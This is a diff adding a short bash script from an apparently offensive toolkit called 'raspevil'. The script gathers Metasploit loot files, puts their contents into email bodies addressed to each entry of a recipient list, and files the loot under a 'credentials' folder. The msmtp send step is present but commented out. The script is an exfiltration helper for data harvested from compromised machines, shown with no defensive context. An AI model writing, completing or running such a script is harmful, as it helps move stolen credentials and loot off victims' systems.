@@ -1,0 +1,13 @@
+#!/bin/bash
+
+sender=$(cat ~/.msmtprc | grep from | cut -d' ' -f2)
+mail=$(cat ~/raspevil/mail_models/mail)
+
+cp ~/.msf4/loot/test* ~/raspevil/tmp # delete
+# mv ~/.msf4/loot/* ~/raspevil/tmp
+body=$(cat ~/raspevil/tmp/*)
+while read p; do
+    mail_to_send=$(echo "$mail" | sed "s/To:.*/To\ :\ $p/g" | sed "s/From:.*/From\ :\ $sender/g")
+    printf "$mail_to_send\n\n$body\n" # | msmtp $p
+done < ~/raspevil/emails
+mv ~/raspevil/tmp/* ~/raspevil/credentials
